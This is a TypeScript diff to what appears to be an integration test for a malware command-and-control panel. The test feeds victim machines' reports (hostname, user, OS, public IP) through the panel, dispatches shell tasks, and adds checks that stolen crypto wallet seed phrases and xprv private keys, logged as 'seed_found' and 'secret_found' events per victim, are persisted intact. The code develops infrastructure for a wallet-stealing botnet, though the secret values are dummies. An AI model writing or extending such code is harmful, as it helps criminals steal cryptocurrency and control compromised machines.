@@ -67,7 +67,7 @@ function nonce(): string {
 }
 
 function frame(type: string, seq: number, key: Buffer, fields: Record<string, unknown> = {}, opts: { id?: string; ts?: number; nonce?: string } = {}): string {
-  const order = ['reply_to', 'body', 'hostname', 'user', 'os', 'cpu', 'ram', 'gpu', 'resolution', 'java', 'agent', 'public_ip', 'path', 'first', 'expect_seq_in', 'code', 'reason'];
+  const order = ['reply_to', 'body', 'hostname', 'user', 'os', 'cpu', 'ram', 'gpu', 'resolution', 'java', 'agent', 'public_ip', 'path', 'first', 'expect_seq_in', 'code', 'reason', 'kind', 'data', 'legacy'];
   const id = opts.id ?? randomUUID();
   const frameNonce = opts.nonce ?? nonce();
   let payload = `{"v":1,"id":"${id}","seq":${seq},"ts":${opts.ts ?? Math.floor(Date.now() / 1000)},"type":"${type}","nonce":"${frameNonce}"`;
@@ -403,6 +403,25 @@ async function main(): Promise<void> {
     check('conflicting final result is a typed 409', dupRes.status === 409 && dup.error === 'already_finished', `${dupRes.status} ${JSON.stringify(dup)}`);
     const sameRes = await fetch(`${BASE}/api/v1/tasks/${shellTask.id}/result`, { method: 'POST', headers: dupHeaders, body: dupBody });
     check('repeated conflict stays 409, never 500', sameRes.status === 409, String(sameRes.status));
+
+    // Structured events: the panel validates, persists and keeps the legacy.
+    const seed = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
+    const seedLegacy = `seed encontrada: 12 palabras\n${seed}`;
+    t4.ws.send(frame('event', t4Seq++, t4Key, { kind: 'seed_found', data: { words: 12, value: seed }, legacy: seedLegacy }));
+    t4.ws.send(frame('event', t4Seq++, t4Key, {
+      kind: 'secret_found',
+      data: { secret_kind: 'xprv', value: `xprv${'A'.repeat(107)}`, confident: true },
+      legacy: 'xprv encontrado'
+    }));
+    let stored: any[] = [];
+    for (let attempt = 0; attempt < 40; attempt++) {
+      stored = await prisma.event.findMany({ where: { victimId: victimB.id }, orderBy: { createdAt: 'asc' } });
+      if (stored.length >= 2) break;
+      await new Promise((resolve) => setTimeout(resolve, 50));
+    }
+    check('both events persisted without closing', stored.length === 2, String(stored.length));
+    check('event legacy is byte-exact', stored[0]?.legacy === seedLegacy, JSON.stringify(stored[0]?.legacy));
+    check('event data keeps secret_kind', (stored[1]?.data as any)?.secret_kind === 'xprv', JSON.stringify(stored[1]?.data));
 
     // A silent reconnect has no result in time: the panel says unknown, not timeout.
     mode = 'silent';
